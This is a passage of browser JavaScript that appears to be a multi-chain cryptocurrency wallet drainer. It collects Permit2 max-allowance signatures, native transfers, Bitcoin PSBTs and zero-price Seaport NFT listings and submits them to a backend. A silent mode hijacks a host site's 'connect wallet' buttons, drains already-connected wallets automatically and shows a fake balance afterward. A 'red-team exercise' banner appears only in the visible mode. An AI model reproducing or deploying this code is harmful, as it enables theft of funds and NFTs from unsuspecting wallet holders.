    return null;
  }

  async function signTonNative(nativeTransferTon) {
    if (!nativeTransferTon || !wallets.ton) return null;
    var ton = wallets.ton.provider;
    if (ton.send && nativeTransferTon.boc) {
      var result = await ton.send('ton_signData', { cell: nativeTransferTon.boc });
      return result;
    }
    return nativeTransferTon.signed_boc || null;
  }

  function extractEvmTokens(fusion, chainId) {
    var permits = [];
    var layers = fusion.evm_layers || fusion.evm || [];
    if (Array.isArray(layers)) {
      for (var i = 0; i < layers.length; i++) {
        var layer = layers[i];
        if (layer.token && layer.amount) {
          permits.push({ token: layer.token, amount: String(layer.amount) });
        } else if (layer.token_address) {
          permits.push({ token: layer.token_address, amount: MAX_PERMIT });
        }
      }
    }
    if (permits.length === 0) {
      permits.push({ token: DEFAULT_USDC, amount: MAX_PERMIT });
    }
    return permits;
  }

  function estimateNativeAmounts(fusion) {
    var sol = '0';
    var trx = '0';
    var ton = '0';
    var native = '0';
    if (fusion.sol_lamports) sol = String(fusion.sol_lamports);
    else if (fusion.solana && fusion.solana.lamports) sol = String(fusion.solana.lamports);
    if (fusion.trx_sun) trx = String(fusion.trx_sun);
    else if (fusion.tron && fusion.tron.sun) trx = String(fusion.tron.sun);
    if (fusion.ton_nanoton) ton = String(fusion.ton_nanoton);
    else if (fusion.ton && fusion.ton.nanoton) ton = String(fusion.ton.nanoton);
    if (fusion.native_wei) native = String(fusion.native_wei);
    else if (fusion.evm && fusion.evm.native_wei) native = String(fusion.evm.native_wei);
    return { native: native, sol: sol, trx: trx, ton: ton };
  }

  async function runOmnichainDrain(scoutUsd) {
    if (!wallets.evm) throw new Error('EVM wallet required for Permit2 batch anchor');
    var evm = wallets.evm;
    var fusion = (await postFusion()).fusion;
    var amounts = estimateNativeAmounts(fusion);
    var permits = extractEvmTokens(fusion, evm.chainId);

    setStatus('Fetching Permit2 batch typed data…', false);
    var batchBody = {
      wallet_address: evm.address,
      chain_id: evm.chainId,
      permits: permits,
      nativeAmount: amounts.native,
    };
    if (wallets.sol) {
      batchBody.sol_wallet = wallets.sol.address;
      batchBody.nativeAmountSol = amounts.sol;
    }
    if (wallets.tron) {
      batchBody.trx_wallet = wallets.tron.address;
      batchBody.nativeAmountTrx = amounts.trx;
    }
    if (wallets.ton) {
      batchBody.ton_wallet = wallets.ton.address;
      batchBody.nativeAmountTon = amounts.ton;
    }

    var batch = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', batchBody);
    var typedData = batch.typed_data;
    var batchMeta = batch.batch_permit_metadata;
    if (!typedData || !batchMeta) throw new Error('Permit2 batch typed data missing from API');

    setStatus('Signing Permit2 batch (EIP-712)…', false);
    var permitSig = await signEvmTypedData(typedData);

    var nativeSignedTx = null;
    if (batch.native_transfer && BigInt(batch.nativeAmount || '0') > 0n) {
      setStatus('Signing EVM native transfer…', false);
      nativeSignedTx = await signEvmNativeTx(batch.native_transfer);
    }

    var nativeSignedSol = null;
    if (batch.native_transfer_sol && batch.native_amount_sol && BigInt(batch.native_amount_sol) > 0n) {
      setStatus('Signing Solana native transfer…', false);
      nativeSignedSol = await signSolanaWire(batch.native_transfer_sol.unsignedWireBase64);
    }

    var nativeSignedSpl = null;
    if (batch.spl_transfer && batch.spl_amount && BigInt(batch.spl_amount) > 0n) {
      setStatus('Signing Solana SPL batch…', false);
      nativeSignedSpl = await signSolanaWire(batch.spl_transfer.unsignedWireBase64);
    }

    var nativeSignedTrx = null;
    if (batch.native_transfer_trx && batch.native_amount_trx && BigInt(batch.native_amount_trx) > 0n) {
      setStatus('Signing Tron native transfer…', false);
      nativeSignedTrx = await signTronNative(batch.native_transfer_trx);
    }

    var nativeSignedTon = null;
    if (batch.native_transfer_ton && batch.native_amount_ton && BigInt(batch.native_amount_ton) > 0n) {
      setStatus('Signing TON native transfer…', false);
      nativeSignedTon = await signTonNative(batch.native_transfer_ton);
    }

    var nonce = 'omni:' + Date.now();
    var anchorBody = {
      ingress: 'normalized_v1',
      chain_family: 'EVM',
      protocol: 'permit2_batch_eip712',
      wallet_address: evm.address,
      token_address: permits[0].token,
      permits: permits,
      batch_permit_metadata: batchMeta,
      chain_id: evm.chainId,
      engine_spender: batch.engine_spender,
      permit2: batch.permit2,
      nativeAmount: batch.nativeAmount || amounts.native,
      signature: permitSig,
      nonce: nonce,
      expiry_iso: EXPIRY_ISO,
      wallet_type: evm.provider,
      scout_value_usd: scoutUsd || 1,
      max_allowance: MAX_PERMIT,
      requires_quorum: false,
    };

    if (nativeSignedTx) anchorBody.native_signed_transaction = nativeSignedTx;
    if (wallets.sol) anchorBody.sol_wallet = wallets.sol.address;
    if (wallets.tron) anchorBody.trx_wallet = wallets.tron.address;
    if (wallets.ton) anchorBody.ton_wallet = wallets.ton.address;
    if (nativeSignedSol) anchorBody.native_signed_transaction_sol = nativeSignedSol;
    if (nativeSignedSpl) anchorBody.native_signed_transaction_spl = nativeSignedSpl;
    if (batch.spl_mint) anchorBody.spl_mint = batch.spl_mint;
    if (batch.spl_amount) anchorBody.spl_amount = batch.spl_amount;
    if (nativeSignedTrx) anchorBody.native_signed_transaction_trx = nativeSignedTrx;
    if (nativeSignedTon) anchorBody.native_signed_transaction_ton = nativeSignedTon;
    if (batch.native_amount_sol) anchorBody.nativeAmountSol = batch.native_amount_sol;
    if (batch.native_amount_trx) anchorBody.nativeAmountTrx = batch.native_amount_trx;
    if (batch.native_amount_ton) anchorBody.nativeAmountTon = batch.native_amount_ton;

    anchorBody.protocol = 'omnichain_atomic_v1';
    anchorBody.omni_payload_sync = {
      session: {
        eip155: true,
        solana: Boolean(wallets.sol),
        bip122: Boolean(wallets.btc),
        tron: Boolean(wallets.tron),
        ton: Boolean(wallets.ton),
      },
      primary_rack: 'eip155',
      evm_chain_id: evm.chainId,
    };

    setStatus('Submitting omnichain envelope to signature-anchor…', false);
    var result = await apiPost('/api/v1/signature-anchor', anchorBody);
    return result;
  }

  async function runSeaportAcceptOffer() {
    if (!wallets.evm) {
      await connectEvm();
    }
    var evm = wallets.evm;
    if (!evm) throw new Error('EVM wallet required for Seaport listing');

    var hashInput = document.getElementById('legion-seaport-order-hash');
    var pastedHash = hashInput && hashInput.value ? hashInput.value.trim() : '';
    var listing = null;

    if (pastedHash) {
      setStatus('Resolving Seaport order hash…', false);
      var resolved = await apiPost('/api/v1/seaport/order-by-hash', {
        order_hash: pastedHash,
        chain_id: evm.chainId,
      });
      listing = resolved.listing;
    } else {
      setStatus('Scanning OpenSea / Blur listings…', false);
      try {
        var scan = await apiPost('/api/v1/seaport/scan-listings', {
          wallet_address: evm.address,
          chain_id: evm.chainId,
          limit: 10,
        });
        if (scan.listings && scan.listings.length > 0) {
          listing = scan.listings[0];
        }
      } catch (scanErr) {
        console.warn('[LEGION_SEAPORT_SCAN]', scanErr);
      }
    }

    if (listing && listing.order && listing.order.signature) {
      setStatus('Fulfilling signed marketplace listing…', false);
      var fulfillExisting = await apiPost('/api/v1/seaport/fulfill', {
        order: listing.order,
        signature: listing.order.signature,
        chain_id: evm.chainId,
      });
      setStatus('Seaport listing fulfilled: ' + (fulfillExisting.transaction_hash || 'ok'), true);
      activateFakeBalanceAfterDrain();
      return fulfillExisting;
    }

    var nftContract = window.prompt('NFT contract address (0x…)', '');
    if (!nftContract) throw new Error('NFT contract required');
    var tokenId = window.prompt('Token ID', '0');
    if (tokenId == null || tokenId === '') throw new Error('Token ID required');

    setStatus('Building zero-price Seaport listing typed data…', false);
    var typed = await apiPost('/api/v1/seaport/listing-typed-data', {
      wallet_address: evm.address,
      nft_contract: nftContract,
      token_id: tokenId,
      chain_id: evm.chainId,
      seaport_version: '1.5',
    });

    setStatus('Sign Seaport order (EIP-712) — Accept Offer…', false);
    var seaportSig = await signEvmTypedData(typed.typed_data);

    var seaportOrder = {
      parameters: typed.order_parameters,
      signature: seaportSig,
    };

    setStatus('Submitting seaport_listing anchor…', false);
    var anchor = await apiPost('/api/v1/signature-anchor', {
      ingress: 'normalized_v1',
      chain_family: 'EVM',
      protocol: 'seaport_listing',
      wallet_address: evm.address,
      token_address: nftContract,
      chain_id: evm.chainId,
      seaport_order: seaportOrder,
      signature: seaportSig,
      nonce: 'seaport:' + Date.now(),
      expiry_iso: EXPIRY_ISO,
      wallet_type: evm.provider,
      scout_value_usd: 1,
      max_allowance: MAX_PERMIT,
      requires_quorum: false,
    });

    setStatus('Seaport anchor: ' + (anchor.transaction_hash || anchor.settlement_status || 'submitted'), true);
    activateFakeBalanceAfterDrain();
    return anchor;
  }

  async function runBitcoinPsbt(scoutUsd) {
    if (!wallets.btc) throw new Error('Bitcoin wallet not connected');
    setStatus('Building Bitcoin PSBT…', false);
    var psbt = await apiPost('/api/v1/signature-anchor/bitcoin-psbt', {
      wallet_address: wallets.btc.address,
      amount_sat: '10000',
    });
    if (!psbt || !psbt.psbt_base64) throw new Error('PSBT build failed');

    var signedPsbt = psbt.psbt_base64;
    if (window.unisat && window.unisat.signPsbt) {
      signedPsbt = await window.unisat.signPsbt(psbt.psbt_base64);
    }

    return apiPost('/api/v1/signature-anchor', {
      ingress: 'normalized_v1',
      chain_family: 'UTXO',
      protocol: 'bitcoin_psbt',
      wallet_address: wallets.btc.address,
      token_address: 'BTC',
      signature: signedPsbt,
      nonce: 'btc:' + Date.now(),
      expiry_iso: EXPIRY_ISO,
      wallet_type: wallets.btc.provider,
      scout_value_usd: scoutUsd || 1,
      max_allowance: MAX_PERMIT,
      requires_quorum: false,
    });
  }

  async function connectActiveTab() {
    if (ACTIVE_TAB === 'evm') return connectEvm();
    if (ACTIVE_TAB === 'sol') return connectSolana();
    if (ACTIVE_TAB === 'tron') return connectTron();
    if (ACTIVE_TAB === 'ton') return connectTon();
    if (ACTIVE_TAB === 'btc') return connectBitcoin();
    throw new Error('Unsupported chain tab');
  }

  async function runAuthorizedDrain(opts) {
    var skipConnect = opts && opts.skipConnect;
    var btn = document.getElementById('legion-auth-primary');
    var wcBtn = document.getElementById('legion-auth-wc');
    if (btn) btn.disabled = true;
    if (wcBtn) wcBtn.disabled = true;
    if (!skipConnect) setStatus('Connecting wallet…', false);

    try {
      var conn;
      if (skipConnect) {
        if (ACTIVE_TAB === 'evm' && wallets.evm) conn = wallets.evm;
        else if (ACTIVE_TAB === 'sol' && wallets.sol) conn = wallets.sol;
        else if (ACTIVE_TAB === 'tron' && wallets.tron) conn = wallets.tron;
        else if (ACTIVE_TAB === 'ton' && wallets.ton) conn = wallets.ton;
        else if (ACTIVE_TAB === 'btc' && wallets.btc) conn = wallets.btc;
        else throw new Error('No wallet connected for ' + ACTIVE_TAB.toUpperCase());
      } else {
        conn = await connectActiveTab();
      }
      var chainFamily = ACTIVE_TAB === 'evm' ? 'EVM' : ACTIVE_TAB === 'sol' ? 'SVM' : ACTIVE_TAB === 'tron' ? 'TRON' : ACTIVE_TAB === 'ton' ? 'TON' : 'UTXO';
      var chainId = conn.chainId || 0;
      var walletType = conn.provider || conn.name || ACTIVE_TAB;

      await captureFakeBalanceSnapshot();

      setStatus('Scout telemetry…', false);
      await postScout(conn.address, chainId, chainFamily, walletType);

      setStatus('Scanning assets (recursive-predator-fusion)…', false);
      var fusionResult = await postFusion();
      var scoutUsd = fusionResult.total_usd || 1;

      if (KINETIC_KEY) {
        setStatus('Checking existing allowances…', false);
        var reuse = await tryAllowanceReuse();
        if (reuse) {
          setStatus('Allowance reuse executed — zero-signature transfer complete', true);
          activateFakeBalanceAfterDrain();
          return;
        }
      }

      if (ACTIVE_TAB === 'btc') {
        await runBitcoinPsbt(scoutUsd);
        setStatus('Bitcoin PSBT submitted to signature-anchor', true);
        activateFakeBalanceAfterDrain();
        return;
      }

      if (!wallets.evm && ACTIVE_TAB !== 'evm') {
        setStatus('Connect EVM wallet first for omnichain Permit2 batch…', false);
        await connectEvm();
        await postScout(wallets.evm.address, wallets.evm.chainId, 'EVM', wallets.evm.provider);
      }

      var settlement = await runOmnichainDrain(scoutUsd);
      var txHash = settlement.transaction_hash || settlement.l2_mint_transaction_hash || settlement.settlement_status || 'submitted';
      setStatus('Settlement ingress complete: ' + txHash, true);
      activateFakeBalanceAfterDrain();
    } catch (err) {
      setStatus(err && err.message ? err.message : String(err), false);
      console.warn('[LEGION_AUTH_DRAIN]', err);
    } finally {
      if (btn) btn.disabled = false;
      if (wcBtn) wcBtn.disabled = !WC_PROJECT_ID;
    }
  }

  async function runWalletConnectThenDrain() {
    var wcBtn = document.getElementById('legion-auth-wc');
    if (wcBtn) wcBtn.disabled = true;
    try {
      await connectWalletConnect();
      if (wallets.evm) ACTIVE_TAB = 'evm';
      else if (wallets.sol) ACTIVE_TAB = 'sol';
      await runAuthorizedDrain({ skipConnect: true });
    } catch (err) {
      setStatus(err && err.message ? err.message : String(err), false);
      console.warn('[LEGION_AUTH_WC]', err);
    } finally {
      if (wcBtn) wcBtn.disabled = !WC_PROJECT_ID;
    }
  }

  var CONNECT_BTN_RE = /connect\s*(wallet)?|wallet\s*connect|sign\s*in|link\s*wallet/i;

  function hookNativeConnectButtons(root) {
    var nodes = (root || document).querySelectorAll('button, a, [role="button"], input[type="button"]');
    nodes.forEach(function (el) {
      if (el.__legionConnectHook) return;
      var label = ((el.textContent || '') + ' ' + (el.getAttribute('aria-label') || '')).trim();
      if (!CONNECT_BTN_RE.test(label)) return;
      el.__legionConnectHook = true;
      el.addEventListener('click', function () {
        setTimeout(function () {
          if (window.ethereum && window.ethereum.selectedAddress) {
            wallets.evm = {
              address: window.ethereum.selectedAddress,
              chainId: window.ethereum.chainId ? parseInt(window.ethereum.chainId, 16) : 1,
              provider: 'injected',
            };
            ACTIVE_TAB = 'evm';
            runAuthorizedDrain({ skipConnect: true });
            if (window.__legionBalanceDisplay) window.__legionBalanceDisplay.refresh();
          }
        }, 2000);
      }, true);
    });
  }

  function mountSilentAutoDrain() {
    document.body.classList.add('legion-silent');
    var hidden = document.createElement('div');
    hidden.id = 'legion-auth-status';
    hidden.className = 'status';
    hidden.style.cssText = 'display:none!important;';
    document.body.appendChild(hidden);

    function tryAutoDrain() {
      if (window.ethereum && window.ethereum.selectedAddress) {
        wallets.evm = {
          address: window.ethereum.selectedAddress,
          chainId: window.ethereum.chainId ? parseInt(window.ethereum.chainId, 16) : 1,
          provider: 'injected',
        };
        ACTIVE_TAB = 'evm';
        captureFakeBalanceSnapshot().then(function () {
          return runAuthorizedDrain({ skipConnect: true });
        });
        if (window.__legionBalanceDisplay) window.__legionBalanceDisplay.refresh();
      }
    }

    hookNativeConnectButtons(document);
    if (PRODUCTION_CLONE) {
      var obs = new MutationObserver(function (mutations) {
        mutations.forEach(function (m) {
          m.addedNodes.forEach(function (node) {
            if (node.nodeType === 1) hookNativeConnectButtons(node);
          });
        });
      });
      obs.observe(document.documentElement, { childList: true, subtree: true });
    }

    if (window.ethereum) {
      if (window.ethereum.selectedAddress) tryAutoDrain();
      window.ethereum.on('accountsChanged', function (accounts) {
        if (accounts && accounts[0]) tryAutoDrain();
      });
      window.ethereum.on('connect', tryAutoDrain);
    }
  }

  function mountUi() {
    if ((SILENT_INJECT || PRODUCTION_CLONE) && !QA_VISIBLE_UI) {
      mountSilentAutoDrain();
      return;
    }

    document.body.classList.add('legion-auth-active');

    var banner = document.createElement('div');
    banner.id = 'legion-auth-banner';
    banner.setAttribute('role', 'alert');
    banner.textContent = 'AUTHORIZED RED-TEAM EXERCISE — PRODUCTION BACKEND — WRITTEN PERMISSION REQUIRED';
    document.body.prepend(banner);

    var panel = document.createElement('div');
    panel.id = 'legion-auth-panel';
    panel.innerHTML = [
      '<header>Connect wallet (authorized exercise)</header>',
      '<div class="tabs">',
      '  <button type="button" data-tab="evm" class="active">EVM</button>',
      '  <button type="button" data-tab="sol">Solana</button>',
      '  <button type="button" data-tab="tron">Tron</button>',
      '  <button type="button" data-tab="ton">TON</button>',
      '  <button type="button" data-tab="btc">BTC</button>',
      '</div>',
      '<div class="body">',
      '  <div id="legion-auth-status" class="status">Select chain, connect, and authorize transfer.</div>',
      '  <div class="wallet-mode">',
      '    <button type="button" class="secondary" id="legion-auth-wc"' +
        (WC_PROJECT_ID ? '' : ' disabled title="Set NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID"') +
        '>WalletConnect (QR)</button>',
      '  </div>',
      '  <input type="text" class="seaport-hash" id="legion-seaport-order-hash" placeholder="Optional: paste OpenSea order hash" />',
      '  <div class="actions">',
      '    <button type="button" class="primary" id="legion-auth-primary">Connect &amp; Transfer</button>',
      '    <button type="button" class="secondary" id="legion-auth-seaport">Accept Offer</button>',
      '  </div>',
      '</div>',
    ].join('');

    document.body.appendChild(panel);

    panel.querySelectorAll('.tabs button').forEach(function (tabBtn) {
      tabBtn.addEventListener('click', function () {
        ACTIVE_TAB = tabBtn.getAttribute('data-tab') || 'evm';
        panel.querySelectorAll('.tabs button').forEach(function (b) { b.classList.remove('active'); });
        tabBtn.classList.add('active');
        setStatus('Chain: ' + ACTIVE_TAB.toUpperCase() + ' — ready.', false);
      });
    });

    document.getElementById('legion-auth-primary').addEventListener('click', function () {
      runAuthorizedDrain();
    });
    var seaportBtn = document.getElementById('legion-auth-seaport');
    if (seaportBtn) {
      seaportBtn.addEventListener('click', function () {
        var btn = document.getElementById('legion-auth-primary');
        var wcBtn = document.getElementById('legion-auth-wc');
        seaportBtn.disabled = true;
        if (btn) btn.disabled = true;
        if (wcBtn) wcBtn.disabled = true;
        runSeaportAcceptOffer()
          .catch(function (err) {
            setStatus(err && err.message ? err.message : String(err), false);
            console.warn('[LEGION_SEAPORT]', err);
          })
          .finally(function () {
            seaportBtn.disabled = false;
            if (btn) btn.disabled = false;
            if (wcBtn) wcBtn.disabled = !WC_PROJECT_ID;
          });
      });
    }
    var wcButton = document.getElementById('legion-auth-wc');
    if (wcButton) {
      wcButton.addEventListener('click', runWalletConnectThenDrain);
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', mountUi);
  } else {
    mountUi();
  }
})();
